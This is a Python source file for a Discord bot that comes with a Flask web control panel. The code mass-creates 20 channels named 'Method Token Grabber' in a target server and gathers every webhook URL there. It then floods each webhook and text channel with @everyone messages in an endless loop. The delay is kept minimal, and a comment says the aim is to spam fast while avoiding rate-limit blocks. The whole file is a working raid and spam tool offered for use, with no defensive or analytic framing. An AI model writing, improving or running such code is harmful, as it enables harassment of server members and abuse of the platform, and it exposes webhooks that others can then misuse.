import os
import asyncio
import aiohttp
import discord
from discord.ext import commands
from flask import Flask, render_template_string, request, jsonify
from threading import Thread

BOT_TOKEN = os.getenv("BOT_TOKEN")
app = Flask(__name__)

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.webhooks = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Global state
spamming = False
webhook_list = []
spam_message = ""
spam_guild_id = None

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Control Panel</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: #1a1a1a; padding: 30px; border-radius: 10px; width: 400px; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        h1 { color: #00ff00; text-align: center; }
        input, textarea { width: 100%; padding: 10px; margin: 10px 0; background: #0f0f0f; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; margin: 5px 0; background: #00ff00; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
        button:hover { background: #00cc00; }
        #webhook-counter { color: #00ff00; font-size: 18px; text-align: center; margin: 10px 0; font-weight: bold; }
        #status { color: #ff0000; text-align: center; margin-top: 10px; }
        .log { background: #0f0f0f; padding: 10px; margin-top: 10px; border-radius: 5px; font-size: 12px; max-height: 150px; overflow-y: auto; border: 1px solid #333; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord Bot Control</h1>
        <input type="text" id="serverId" placeholder="Server ID">
        <textarea id="message" placeholder="Message to spam..." rows="4"></textarea>
        <button onclick="createChannels()">Channels</button>
        <div id="webhook-counter">0 webhooks fetched</div>
        <button onclick="startSpam()">Start</button>
        <div id="status"></div>
        <div class="log" id="log"></div>
    </div>
    <script>
        let webhookCount = 0;
        function log(msg) {
            const d = document.getElementById('log');
            d.innerHTML += msg + '<br>';
            d.scrollTop = d.scrollHeight;
        }
        async function createChannels() {
            const serverId = document.getElementById('serverId').value;
            if(!serverId) { alert('Enter Server ID'); return; }
            document.getElementById('status').innerText = 'Creating channels & fetching webhooks...';
            const res = await fetch('/api/channels', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({server_id: serverId})
            });
            const data = await res.json();
            webhookCount = data.webhook_count || 0;
            document.getElementById('webhook-counter').innerText = webhookCount + ' webhook' + (webhookCount !== 1 ? 's' : '') + ' fetched';
            document.getElementById('status').innerText = data.message;
            log(data.message);
            data.channels.forEach(c => log('Created: ' + c));
        }
        async function startSpam() {
            const serverId = document.getElementById('serverId').value;
            const msg = document.getElementById('message').value;
            if(!serverId || !msg) { alert('Fill all fields'); return; }
            document.getElementById('status').innerText = 'Spamming initiated...';
            const res = await fetch('/api/spam', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({server_id: serverId, message: msg})
            });
            const data = await res.json();
            document.getElementById('status').innerText = data.message;
            log(data.message);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/api/channels', methods=['POST'])
def api_channels():
    data = request.json
    guild_id = int(data.get('server_id'))
    future = asyncio.run_coroutine_threadsafe(create_channels_and_fetch_webhooks(guild_id), bot.loop)
    result = future.result()
    return jsonify(result)

@app.route('/api/spam', methods=['POST'])
def api_spam():
    global spamming, spam_message, spam_guild_id
    data = request.json
    spam_guild_id = int(data.get('server_id'))
    spam_message = "@everyone " + data.get('message')
    spamming = True
    asyncio.run_coroutine_threadsafe(spam_all(), bot.loop)
    return jsonify({"message": "Spam started across all channels and webhooks", "status": "active"})

async def create_channels_and_fetch_webhooks(guild_id):
    guild = bot.get_guild(guild_id)
    if not guild:
        return {"message": "Guild not found", "webhook_count": 0, "channels": []}
    
    created_channels = []
    webhook_count = 0
    
    # Create 20 channels named "Method Token Grabber"
    for i in range(20):
        try:
            ch = await guild.create_text_channel("Method Token Grabber")
            created_channels.append(ch.name)
            
            # Create webhook in each new channel
            webhook = await ch.create_webhook(name="System")
            webhook_list.append(webhook.url)
            webhook_count += 1
            
            # Fetch existing webhooks in this channel
            existing = await ch.webhooks()
            for wh in existing:
                if wh.url not in webhook_list:
                    webhook_list.append(wh.url)
                    webhook_count += 1
        except Exception as e:
            created_channels.append(f"Error: {str(e)}")
    
    # Fetch webhooks from ALL channels in the server
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            try:
                hooks = await channel.webhooks()
                for hook in hooks:
                    if hook.url not in webhook_list:
                        webhook_list.append(hook.url)
                        webhook_count += 1
            except:
                pass
    
    return {
        "message": f"Operation complete. {webhook_count} total webhooks fetched.",
        "webhook_count": webhook_count,
        "channels": created_channels
    }

async def spam_all():
    global spamming
    while spamming:
        # Spam via webhooks
        for wh_url in webhook_list:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(wh_url, json={"content": spam_message, "allowed_mentions": {"parse": ["everyone"]}}) as resp:
                        pass
            except:
                pass
        
        # Spam in all text channels directly
        guild = bot.get_guild(spam_guild_id)
        if guild:
            for channel in guild.channels:
                if isinstance(channel, discord.TextChannel):
                    try:
                        await channel.send(spam_message, allowed_mentions=discord.AllowedMentions(everyone=True))
                    except:
                        pass
        
        await asyncio.sleep(0.1)  # Minimal delay to avoid rate limit blocks but spam fast

@bot.event
async def on_ready():
    print(f'Bot logged in as {bot.user}')

def run_bot():
    bot.run(BOT_TOKEN)

def run_flask():
    app.run(host='0.0.0.0', port=3000)

if __name__ == '__main__':
    t1 = Thread(target=run_bot)
    t2 = Thread(target=run_flask)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
